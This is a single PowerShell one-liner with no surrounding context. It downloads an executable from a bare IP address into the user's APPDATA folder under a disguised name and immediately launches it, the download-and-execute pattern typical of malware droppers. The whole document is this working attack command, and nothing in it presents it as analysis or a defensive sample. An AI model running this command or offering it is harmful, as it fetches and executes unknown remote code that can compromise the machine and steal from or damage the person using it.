
(New-Object System.Net.WebClient).DownloadFile('http://89.248.166.140/~zebra/iesecv.exe',"$env:APPDATA\scvkem.exe");Start-Process ("$env:APPDATA\scvkem.exe")

